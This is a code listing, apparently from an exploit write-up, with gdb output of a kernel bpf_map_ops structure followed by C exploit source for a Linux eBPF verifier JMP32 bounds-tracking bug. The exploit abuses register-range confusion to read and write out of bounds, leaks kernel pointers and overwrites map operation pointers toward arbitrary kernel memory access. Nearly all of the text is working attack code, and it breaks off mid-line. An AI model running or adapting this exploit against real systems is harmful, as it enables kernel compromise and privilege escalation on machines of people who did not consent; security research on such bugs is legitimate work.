<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(remote) gef➤  p *(<span class="keyword">struct</span> bpf_map_ops*)<span class="number">0xffffffff8206cb40</span></span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  map_alloc_check = <span class="number">0xffffffff811fd5e0</span> &lt;array_map_alloc_check&gt;,</span><br><span class="line">  map_alloc = <span class="number">0xffffffff811fe5a0</span> &lt;array_map_alloc&gt;,</span><br><span class="line">  map_release = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  map_free = <span class="number">0xffffffff811fdd30</span> &lt;array_map_free&gt;,</span><br><span class="line">  map_get_next_key = <span class="number">0xffffffff811fd6d0</span> &lt;array_map_get_next_key&gt;,</span><br><span class="line">  map_release_uref = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  map_lookup_elem_sys_only = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  map_lookup_batch = <span class="number">0xffffffff811e5ae0</span> &lt;generic_map_lookup_batch&gt;,</span><br><span class="line">  map_lookup_and_delete_batch = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  map_update_batch = <span class="number">0xffffffff811e58b0</span> &lt;generic_map_update_batch&gt;,</span><br><span class="line">  map_delete_batch = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  map_lookup_elem = <span class="number">0xffffffff811fd790</span> &lt;array_map_lookup_elem&gt;,</span><br><span class="line">  map_update_elem = <span class="number">0xffffffff811fdbf0</span> &lt;array_map_update_elem&gt;,</span><br><span class="line">  map_delete_elem = <span class="number">0xffffffff811fd710</span> &lt;array_map_delete_elem&gt;,</span><br><span class="line">  map_push_elem = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  map_pop_elem = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  map_peek_elem = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  map_fd_get_ptr = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  map_fd_put_ptr = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  map_gen_lookup = <span class="number">0xffffffff811fda60</span> &lt;array_map_gen_lookup&gt;,</span><br><span class="line">  map_fd_sys_lookup_elem = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  map_seq_show_elem = <span class="number">0xffffffff811fd870</span> &lt;array_map_seq_show_elem&gt;,</span><br><span class="line">  map_check_btf = <span class="number">0xffffffff811fe3b0</span> &lt;array_map_check_btf&gt;,</span><br><span class="line">  map_poke_track = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  map_poke_untrack = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  map_poke_run = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  map_direct_value_addr = <span class="number">0xffffffff811fd660</span> &lt;array_map_direct_value_addr&gt;,</span><br><span class="line">  map_direct_value_meta = <span class="number">0xffffffff811fd690</span> &lt;array_map_direct_value_meta&gt;,</span><br><span class="line">  map_mmap = <span class="number">0xffffffff811fd830</span> &lt;array_map_mmap&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bpf_insn.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> socks[<span class="number">2</span>] = &#123;<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> control_mapfd,exp_mapfd;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf</span><span class="params">(<span class="type">int</span> cmd,<span class="keyword">union</span> bpf_attr *attr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, cmd, attr, <span class="keyword">sizeof</span>(*attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf_prog_load</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_PROG_LOAD,attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span> bpf_attr* <span class="title function_">creat_bpf_prog</span><span class="params">(<span class="keyword">struct</span> bpf_insn *insns,<span class="type">unsigned</span> <span class="type">int</span> insn_cnt)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span>* <span class="title">attr</span>=</span>(<span class="keyword">union</span> bpf_attr*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">union</span> bpf_attr));</span><br><span class="line"></span><br><span class="line">    attr-&gt;prog_type=BPF_PROG_TYPE_SOCKET_FILTER;</span><br><span class="line">    attr-&gt;insn_cnt=insn_cnt;</span><br><span class="line">    attr-&gt;insns=(<span class="type">uint64_t</span>)insns;</span><br><span class="line">    attr-&gt;license=(<span class="type">uint64_t</span>)<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> attr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">attach_socket</span><span class="params">(<span class="type">int</span> prog_fd)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(socks[<span class="number">0</span>]==<span class="number">-1</span>&amp;&amp;socketpair(AF_UNIX,SOCK_DGRAM,<span class="number">0</span>,socks)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;socketpair&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, <span class="keyword">sizeof</span>(prog_fd)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;setsockopt&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup_bpf_prog</span><span class="params">(<span class="keyword">struct</span> bpf_insn* insns,uint insncnt)</span>&#123;</span><br><span class="line">    <span class="type">char</span> log_buffer[<span class="number">0x4000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> *<span class="title">prog</span>=</span>creat_bpf_prog(insns,insncnt);</span><br><span class="line"></span><br><span class="line">    prog-&gt;log_level=<span class="number">2</span>;</span><br><span class="line">    prog-&gt;log_buf=(<span class="type">uint64_t</span>)log_buffer;</span><br><span class="line">    prog-&gt;log_size=<span class="keyword">sizeof</span>(log_buffer);</span><br><span class="line">    <span class="built_in">strncpy</span>(prog-&gt;prog_name, <span class="string">&quot;stdnoerr&quot;</span>, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> prog_fd=bpf_prog_load(prog);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">strlen</span>(log_buffer));</span><br><span class="line">    <span class="built_in">puts</span>(log_buffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(prog_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;prog_load&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    attach_socket(prog_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">run_bpf_prog</span><span class="params">(<span class="keyword">struct</span> bpf_insn *insns,uint insncnt)</span>&#123;</span><br><span class="line">    <span class="type">int</span> val=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    setup_bpf_prog(insns,insncnt);</span><br><span class="line">    write(socks[<span class="number">1</span>],&amp;val,<span class="keyword">sizeof</span>(val));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf_map_create</span><span class="params">(<span class="type">uint32_t</span> key_size,<span class="type">uint32_t</span> value_size,<span class="type">uint32_t</span> max_entries)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span>=</span>&#123;</span><br><span class="line">        .map_type = BPF_MAP_TYPE_ARRAY,</span><br><span class="line">        .key_size = key_size,</span><br><span class="line">        .value_size = value_size,</span><br><span class="line">        .max_entries = max_entries</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_CREATE,&amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf_map_update_elem</span><span class="params">(<span class="type">int</span> map_fd, <span class="type">uint64_t</span> key, <span class="type">uint64_t</span>* value, <span class="type">uint64_t</span> flags)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = map_fd,</span><br><span class="line">        .key = (<span class="type">uint64_t</span>) &amp;key,</span><br><span class="line">        .value = (<span class="type">uint64_t</span>) value,</span><br><span class="line">        .flags = flags</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bpf_map_lookup_elem</span><span class="params">(<span class="type">int</span> map_fd, <span class="type">uint32_t</span> key, <span class="type">void</span>* buf)</span>&#123;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = map_fd,</span><br><span class="line">        .key = (<span class="type">uint64_t</span>) &amp;key,</span><br><span class="line">        .value = (<span class="type">uint64_t</span>) buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    control_mapfd=bpf_map_create(<span class="number">4</span>,<span class="number">0x100</span>,<span class="number">1</span>);</span><br><span class="line">    exp_mapfd=bpf_map_create(<span class="number">4</span>,<span class="number">0x2000</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(control_mapfd &lt; <span class="number">0</span> || exp_mapfd &lt; <span class="number">0</span> )&#123;</span><br><span class="line">        perror(<span class="string">&quot;create map&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *control_buf=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">char</span> *exp_buf=<span class="built_in">malloc</span>(<span class="number">0x3000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span>* control_buf64=(<span class="type">uint64_t</span>*)control_buf;</span><br><span class="line">    <span class="type">uint64_t</span>* exp_buf64=(<span class="type">uint64_t</span>*)exp_buf;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(control_buf,<span class="string">&#x27;a&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>/<span class="number">8</span>;i++)&#123;</span><br><span class="line">        exp_buf64[i]=i+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    control_buf64[<span class="number">0</span>]=<span class="number">0x2</span>;</span><br><span class="line">    control_buf64[<span class="number">1</span>]=<span class="number">0x0</span>;</span><br><span class="line">    bpf_map_update_elem(control_mapfd,<span class="number">0</span>,control_buf64,BPF_ANY);</span><br><span class="line">    bpf_map_update_elem(exp_mapfd,<span class="number">0</span>,exp_buf64,BPF_ANY);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">test_prog</span>[]=</span>&#123;</span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_0,<span class="number">0</span>), <span class="comment">// r0=0</span></span><br><span class="line">        BPF_LD_MAP_FD(BPF_REG_1,control_mapfd),<span class="comment">// r1=ctrlfd</span></span><br><span class="line">        BPF_STX_MEM(BPF_W,BPF_REG_10,BPF_REG_0,<span class="number">-4</span>),<span class="comment">//  *(r10-4)=r0=0</span></span><br><span class="line">        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),<span class="comment">// r6=r1</span></span><br><span class="line">        BPF_LD_MAP_FD(BPF_REG_1, control_mapfd),<span class="comment">//r1=&amp;control_mapfd</span></span><br><span class="line">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),<span class="comment">//</span></span><br><span class="line">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-4</span>),<span class="comment">//r2=r10-4  *r2=0</span></span><br><span class="line">        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), <span class="comment">// r0=map_lookup(r1,r2)</span></span><br><span class="line">        <span class="comment">// returns map_ptr + 0x110 (offset of .values in bpf_array)</span></span><br><span class="line"></span><br><span class="line">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">        BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">        BPF_MOV64_REG(BPF_REG_7,BPF_REG_0),<span class="comment">//r7=r0</span></span><br><span class="line">        BPF_LDX_MEM(BPF_DW,<span class="number">6</span>,<span class="number">7</span>,<span class="number">0</span>),<span class="comment">//r6=*(r7)=ctrlmap[0]=2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        BPF_ALU64_IMM(BPF_MOV,BPF_REG_0,<span class="number">0</span>),</span><br><span class="line">        <span class="comment">//to set umin 1</span></span><br><span class="line">        BPF_JMP_IMM(BPF_JGE,BPF_REG_6,<span class="number">1</span>,<span class="number">1</span>),</span><br><span class="line">        BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_8,<span class="number">0x1</span>),</span><br><span class="line">        BPF_ALU64_IMM(BPF_LSH,BPF_REG_8,<span class="number">32</span>),</span><br><span class="line">        BPF_ALU64_IMM(BPF_ADD,BPF_REG_8,<span class="number">1</span>),</span><br><span class="line">        <span class="comment">//to set  umax 0x100000001</span></span><br><span class="line">        BPF_JMP_REG(BPF_JLE,BPF_REG_6,BPF_REG_8,<span class="number">1</span>),</span><br><span class="line">        BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">        <span class="comment">//  JMP32   the bug</span></span><br><span class="line">        BPF_JMP32_IMM(BPF_JNE,BPF_REG_6,<span class="number">5</span>,<span class="number">1</span>),</span><br><span class="line">        BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">        <span class="comment">// real r6=2 , fake r6 = 1</span></span><br><span class="line">        BPF_ALU64_IMM(BPF_AND, BPF_REG_6, <span class="number">2</span>),</span><br><span class="line">        BPF_ALU64_IMM(BPF_RSH, BPF_REG_6, <span class="number">1</span>),</span><br><span class="line">        <span class="comment">//   (r6&amp;2)&gt;&gt;1  ===&gt; r6=1  fake r6 = 0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// init done  </span></span><br><span class="line">        <span class="comment">// now r6=1  , r7=ctrmap_prt+0x110</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL,BPF_REG_6,<span class="number">0x110</span>),</span><br><span class="line"></span><br><span class="line">        <span class="comment">// outmap  r6=0x110</span></span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_0,<span class="number">0</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_W,BPF_REG_10,BPF_REG_0,<span class="number">-4</span>),<span class="comment">//  *(r10-4)=r0=0</span></span><br><span class="line">        BPF_LD_MAP_FD(BPF_REG_1, exp_mapfd),<span class="comment">//r1=&amp;exp_mapfd</span></span><br><span class="line">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),<span class="comment">//</span></span><br><span class="line">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-4</span>),<span class="comment">//r2=r10-4  *r2=0</span></span><br><span class="line">        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),</span><br><span class="line">        <span class="comment">//ret r0=expmap_ptr+0x110</span></span><br><span class="line"></span><br><span class="line">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">        BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">        BPF_MOV64_REG(BPF_REG_9,<span class="number">0</span>),</span><br><span class="line">        <span class="comment">//r9=expmap_ptr+0x110   </span></span><br><span class="line">        BPF_ALU64_REG(BPF_SUB,BPF_REG_9,BPF_REG_6),</span><br><span class="line">        <span class="comment">//r9=expmap_ptr  fake r9 remain expmap_ptr+0x110</span></span><br><span class="line"></span><br><span class="line">        BPF_LDX_MEM(BPF_DW,BPF_REG_8,BPF_REG_9,<span class="number">0</span>), <span class="comment">// r8=*(r9)=expops_addr</span></span><br><span class="line"></span><br><span class="line">        BPF_STX_MEM(BPF_DW,BPF_REG_7,BPF_REG_8,<span class="number">0x10</span>),</span><br><span class="line">        <span class="comment">// *(expmap_prt+0x110+0x10)=r9=ops_addr</span></span><br><span class="line"></span><br><span class="line">        BPF_MOV64_REG(BPF_REG_2,BPF_REG_8),<span class="comment">//r2=r8</span></span><br><span class="line">        </span><br><span class="line">        BPF_LDX_MEM(BPF_DW,BPF_REG_8,BPF_REG_9,<span class="number">0xc0</span>),</span><br><span class="line">        <span class="comment">// r8= *(r9+0xc0)=*(ops_addr+0xc0)=map_addr+0xc0  </span></span><br><span class="line">        BPF_STX_MEM(BPF_DW,BPF_REG_7,BPF_REG_8,<span class="number">0x18</span>),</span><br><span class="line">        <span class="comment">//  *(r7+0x18)=*(map_prt+0x110+0x18)=*(ops_addr+0xc0)=map_addr </span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        BPF_STX_MEM(BPF_DW,BPF_REG_7,BPF_REG_9,<span class="number">0x40</span>),</span><br><span class="line">        <span class="comment">// *(r7+0x40)=*(map_ptr+0x110+0x40)=r9=ops_addr </span></span><br><span class="line">        BPF_ALU64_IMM(BPF_ADD,BPF_REG_8,<span class="number">0x50</span>),</span><br><span class="line">        <span class="comment">// r8+=0x50  r8=*(ops_addr+0xc0)+0x50= map_addr+0x110</span></span><br><span class="line"></span><br><span class="line">        BPF_LDX_MEM(BPF_DW,BPF_REG_2,BPF_REG_7,<span class="number">0x8</span>),</span><br><span class="line">        <span class="comment">// r2=*(r7+8)=update[1]  </span></span><br><span class="line">        BPF_JMP_IMM(BPF_JNE,BPF_REG_2,<span class="number">1</span>,<span class="number">4</span>),<span class="comment">//for first time leak jmp</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// map_addr == ops_addr</span></span><br><span class="line">        <span class="comment">// map_get_next_key = *(ops_addr+0x20)</span></span><br><span class="line">        <span class="comment">// map_push= *(ops_addr+0x70)</span></span><br><span class="line">        <span class="comment">// *(map_prt+0x110+0x10)=ops_addr</span></span><br><span class="line">        <span class="comment">// 0x70-0x20=0x50</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// so just let *(ops_addr)=expmap_ptr+0x110 </span></span><br><span class="line">        BPF_STX_MEM(BPF_DW,BPF_REG_9,BPF_REG_8,<span class="number">0</span>),</span><br><span class="line">        <span class="comment">// *(r9)=*(ops_addr)=map_addr+0x110</span></span><br><span class="line">        <span class="comment">// ops-&gt;push == map_get_next_key</span></span><br><span class="line">        <span class="comment">// value =&gt; key ; flags =&gt; next_key</span></span><br><span 